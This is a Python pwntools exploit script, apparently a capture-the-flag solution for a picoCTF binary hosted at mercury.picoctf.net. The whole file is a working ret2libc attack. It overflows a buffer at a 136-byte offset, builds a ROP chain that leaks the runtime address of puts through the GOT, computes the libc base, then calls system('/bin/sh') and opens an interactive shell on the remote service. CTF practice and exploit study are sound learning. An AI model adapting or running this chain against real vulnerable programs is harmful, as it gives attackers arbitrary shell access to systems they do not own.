from pwn import * 

def main():

	local = False
	elf = ELF('./vuln')
	
	if local:

		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		p = elf.process()

	else:

		host = 'mercury.picoctf.net'
		port = 49464
		p = remote(host, port)
		libc = ELF('./libc.so.6')

	offset = 136 
	payload = b'A' * offset 


	puts_plt = elf.plt['puts']
	main = elf.symbols['main']
	puts_got = elf.got['puts']
	libc_start_main = elf.symbols['__libc_start_main']
	rop = ROP(elf)
	pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
	ret_gadget = (rop.find_gadget(['ret']))[0]


	payload = b'A' * offset 
	rop = payload 
	rop += p64(pop_rdi)
	rop += p64(puts_got)
	rop += p64(puts_plt)
	rop += p64(main)

	p.sendlineafter("sErVeR!", rop)

	p.recvline()
	p.recvline()
	puts_at_runtime = u64(p.recvline().strip().ljust(8, b'\x00'))
	print()

	#calculating address of libc base 
	libc.address = puts_at_runtime - libc.sym['puts']
	bin_sh = next(libc.search(b'/bin/sh'))
	system_addr = libc.sym['system']
	
	rop2 = payload 
	rop2 += p64(ret_gadget)
	rop2 += p64(pop_rdi)
	rop2 += p64(bin_sh)
	rop2 += p64(system_addr)

	p.sendlineafter("sErVeR!", rop2)

	p.interactive()
if __name__ == "__main__":

	main()